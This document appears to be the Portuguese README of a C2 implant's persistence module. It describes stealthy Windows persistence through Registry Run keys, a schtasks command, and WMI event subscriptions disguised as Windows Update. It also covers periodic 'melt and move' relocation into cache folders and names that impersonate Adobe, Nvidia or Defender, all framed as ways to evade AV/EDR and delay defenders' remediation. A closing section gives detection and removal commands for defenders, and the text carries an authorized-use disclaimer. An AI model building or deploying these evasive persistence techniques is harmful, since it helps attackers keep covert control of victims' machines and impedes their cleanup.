# Técnicas de Persistência Implementadas

## Visão Geral

Este módulo implementa múltiplas técnicas de persistência furtivas para o Sentinel Implant, seguindo princípios de **Defense in Depth** (defesa em profundidade) e **Stealth Operations**.

---

## 🎯 Técnicas Implementadas

### 1. Registry Run Key (HKCU)
**Arquivo:** `persistence.go`
**Função:** `createRegistryPersistence()`

#### Descrição
Cria entrada na chave de registro `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` para execução automática no logon do usuário.

#### Características
- ✅ Não requer privilégios administrativos (HKCU ao invés de HKLM)
- ✅ Compatibilidade universal com todas versões do Windows
- ⚠️ Moderadamente detectável (monitoramento comum por EDR)
- ✅ Nome aleatório de serviço legítimo para mascaramento

#### Técnica de Evasão
- Usa nomes que imitam serviços reais: `OneDriveUpdate`, `WindowsHealthCheck`, etc.
- Evita HKLM que é mais monitorado e requer admin

#### MITRE ATT&CK
- **T1547.001** - Boot or Logon Autostart Execution: Registry Run Keys

---

### 2. Scheduled Tasks
**Arquivo:** `advanced_persistence.go`
**Função:** `InstallScheduledTask()`

#### Descrição
Cria uma tarefa agendada do Windows que executa o implant no logon do usuário.

#### Características
- ✅ Persistência robusta (sobrevive a limpezas de registry simples)
- ✅ Pode executar com privilégios elevados (HIGHEST)
- ✅ Menos monitorada que Registry Run por ferramentas básicas
- ⚠️ Requer `schtasks.exe` (presente em todos Windows)

#### Comando Utilizado
```cmd
schtasks /Create /TN <RandomName> /TR "<ExePath>" /SC ONLOGON /RL HIGHEST /F
```

#### Técnica de Evasão
- Task Name usa nomenclatura genérica do sistema
- `/RL HIGHEST` tenta obter privilégios máximos disponíveis sem UAC prompt
- `/F` sobrescreve silenciosamente tasks existentes

#### MITRE ATT&CK
- **T1053.005** - Scheduled Task/Job: Scheduled Task

---

### 3. WMI Event Subscription (AVANÇADO)
**Arquivo:** `advanced_persistence.go`
**Função:** `InstallWMIPersistence()`

#### Descrição
Técnica **altamente furtiva** que usa Windows Management Instrumentation (WMI) para criar subscriptions de eventos que executam o implant.

#### Características
- 🔥 **Muito furtivo** - Raramente detectado por AV/EDR tradicionais
- 🔥 Execução baseada em eventos do sistema
- ⚠️ Pode requerer privilégios elevados
- ⚠️ Mais complexo e pode falhar em ambientes restritos

#### Funcionamento
1. Cria um **Event Filter** que monitora eventos do sistema (a cada 30 min)
2. Cria um **CommandLineEventConsumer** que executa o binário
3. Vincula filtro ao consumer via **FilterToConsumerBinding**

#### Componentes WMI
- **Filter Name:** `MicrosoftWindowsUpdateFilter`
- **Consumer Name:** `MicrosoftWindowsUpdateConsumer`
- **Trigger:** Modificações em `Win32_PerfFormattedData_PerfOS_System` (WITHIN 1800 segundos)

#### Técnica de Evasão
- Armazenado em `root\subscription` namespace (difícil de enumerar)
- Nomes imitam componentes legítimos do Windows Update
- PowerShell executado com `-WindowStyle Hidden` e `-NonInteractive`

#### MITRE ATT&CK
- **T1546.003** - Event Triggered Execution: Windows Management Instrumentation Event Subscription

---

## 🔄 Migração Polimórfica (Melt & Move)

### Descrição
Sistema de migração automática que **move o executável** para diferentes localizações periodicamente.

### Arquivo
`persistence.go` - Funções `MigrateLocation()`, `ShouldMigrate()`

### Funcionamento

#### 1. Localizações Seguras (User-Mode)
```go
var safePaths = []string{
    "AppData\\Local\\Temp",
    "AppData\\Local\\Microsoft\\Windows\\INetCache",
    "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache",
    "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache",
    "AppData\\Roaming\\Microsoft\\Windows\\Recent",
    "AppData\\Local\\Microsoft\\CLR_v4.0",
    "Documents",
}
```

#### 2. Intervalo de Migração
- **Mínimo:** 4 horas
- **Máximo:** 12 horas
- **Randomização:** Jitter criptograficamente seguro via `crypto/rand`

#### 3. Processo de Migração
1. Verifica se passou tempo mínimo desde última migração
2. Gera novo caminho aleatório de `safePaths` + nome legítimo aleatório
3. Copia binário para novo local
4. Remove persistência antiga
5. Cria persistência apontando para novo local
6. Atualiza estado interno (`migrationState`)

#### Técnica de Evasão
- Dificulta análise forense baseada em caminhos fixos
- Nomes de arquivo mudam a cada migração
- Caminhos ficam "escondidos" em diretórios de cache e temp
- Impede remoção manual (se remover um local, outro assume)

#### MITRE ATT&CK
- **T1027** - Obfuscated Files or Information
- **T1070.004** - Indicator Removal on Host: File Deletion

---

## 🔐 Mutex de Instância Única

### Arquivo
`persistence.go` - Função `EnsureSingleInstance()`

### Descrição
Garante que apenas **uma instância** do implant está rodando simultaneamente usando **Named Mutex** do Windows.

### Funcionamento
```go
mutexName = "Global\\MicrosoftWindowsUpdateSyncMutex"
```

- Cria mutex global usando Win32 API `CreateMutex`
- Se mutex já existe (`ERROR_ALREADY_EXISTS`), processo termina
- Mutex não é liberado até processo terminar (garante exclusividade)

### Técnica de Evasão
- Nome genérico que parece serviço legítimo
- Namespace `Global\` para abranger todos usuários
- Previne múltiplas execuções acidentais que chamariam atenção

---

## 🛡️ Estratégia Multi-Layer (Defesa em Profundidade)

### Função Principal
`InstallMultiLayerPersistence()` em `advanced_persistence.go`

### Abordagem
Instala **múltiplos métodos simultaneamente** para garantir que pelo menos um sobreviva:

1. **Registry Run** (mais compatível)
2. **Scheduled Task** (mais robusto)
3. **WMI Event** (mais furtivo - opcional, comentado por padrão)

### Lógica
```go
successCount := 0

// Tenta Registry
if createRegistryPersistence(path) == nil { successCount++ }

// Tenta Scheduled Task
if InstallScheduledTask(path) == nil { successCount++ }

// Sucesso se QUALQUER método funcionou
if successCount > 0 { return nil }
```

### Vantagens
- Se AV/EDR remove Registry Run, Scheduled Task permanece
- Se administrador limpa Tasks, Registry volta na próxima migração
- Aumenta **Mean Time To Remediation (MTTR)** para Blue Team

---

## 📊 Scheduler de Migração Automática

### Arquivo
`scheduler.go`

### Descrição
Goroutine em background que verifica periodicamente se é hora de migrar.

### Funcionamento
```go
ticker := time.NewTicker(1 * time.Hour)

for {
    select {
    case <-ticker.C:
        if ShouldMigrate() {
            _ = MigrateLocation()
        }
    case <-s.stopChan:
        return
    }
}
```

- Verifica a cada **1 hora** se passou o intervalo de migração
- Migração ocorre entre **4-12 horas** (aleatório)
- Executa silenciosamente em background (não bloqueia operação)

---

## 🎭 Polimorfismo de Nomes

### Nomes Legítimos Usados
```go
var legitimateNames = []string{
    "OneDriveUpdate.exe",
    "WindowsHealthCheck.exe",
    "MicrosoftEdgeUpdate.exe",
    "AdobeUpdateService.exe",
    "GoogleUpdateTask.exe",
    "NvidiaDriverUpdate.exe",
    "RealtekAudioService.exe",
    "IntelGraphicsUpdate.exe",
    "SystemTelemetryService.exe",
    "WindowsDefenderScheduler.exe",
}
```

### Estratégia
- Cada instalação/migração escolhe **nome aleatório**
- Nomes imitam serviços reais e conhecidos
- Dificulta identificação por nome de processo
- Passa desapercebido em listas de processos

---

## 🔬 Detecção e Mitigação (Perspectiva Blue Team)

### Como Detectar

#### 1. Monitoramento de Registry
```powershell
Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
```
Procurar por nomes suspeitos ou caminhos em locais incomuns.

#### 2. Auditoria de Scheduled Tasks
```cmd
schtasks /query /fo LIST /v
```
Verificar tasks com nomes genéricos executando binários de locais não-padrão.

#### 3. Enumeração WMI Subscriptions
```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
```

#### 4. EDR/XDR Modernos
- **SentinelOne, CrowdStrike, Microsoft Defender ATP**
- Detectam criação de scheduled tasks suspeitas
- Monitoram modificações em WMI subscriptions
- Behavioral analysis detecta padrões de C2

### Como Remover

#### Remoção Manual
```powershell
# Registry
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name <SuspiciousName>

# Scheduled Task
schtasks /delete /tn <TaskName> /f

# WMI (requer conhecimento do FilterName)
Get-WmiObject -Namespace root\subscription -Class __EventFilter |
    Where-Object {$_.Name -like '*Suspicious*'} | Remove-WmiObject
```

#### Remoção Automática (pelo próprio implant)
```go
stealth.RemoveAllPersistence()
```

---

## 📚 Referências MITRE ATT&CK

| Técnica | ID | Descrição |
|---------|----|-----------|
| Registry Run Keys | T1547.001 | Autostart via registro |
| Scheduled Task | T1053.005 | Agendamento de tarefas |
| WMI Event Subscription | T1546.003 | Execução baseada em eventos WMI |
| File Deletion | T1070.004 | Remoção de binários antigos pós-migração |
| Obfuscation | T1027 | Polimorfismo de nomes e caminhos |

---

## ⚠️ Disclaimer

> **USO EXCLUSIVO PARA PESQUISA E AMBIENTES AUTORIZADOS**
>
> Estas técnicas são implementadas para fins educacionais, pentest autorizado, CTF e pesquisa de segurança.
> O uso não autorizado em sistemas de terceiros é ILEGAL e pode resultar em sanções criminais.

---

## 🔧 Configuração

### Desabilitar WMI Persistence (Menos Agressivo)
Em `advanced_persistence.go`, a chamada WMI está comentada por padrão:

```go
// Comentado: muito agressivo
// if err := InstallWMIPersistence(executablePath); err == nil {
//     successCount++
// }
```

Descomentar apenas se necessário para operações de longo prazo.

### Ajustar Intervalo de Migração
Em `persistence.go`, modificar:

```go
func ShouldMigrate() bool {
    minInterval := 4 * time.Hour  // Alterar aqui
    maxInterval := 12 * time.Hour // Alterar aqui
    ...
}
```

### Adicionar Novos Nomes Legítimos
Em `persistence.go`:

```go
var legitimateNames = []string{
    // Adicionar novos aqui
    "CustomService.exe",
    ...
}
```

---

**Última atualização:** 2025-11
**Versão:** 2.0.0
**Autor:** Matheus Grego - Sentinel C2 Project
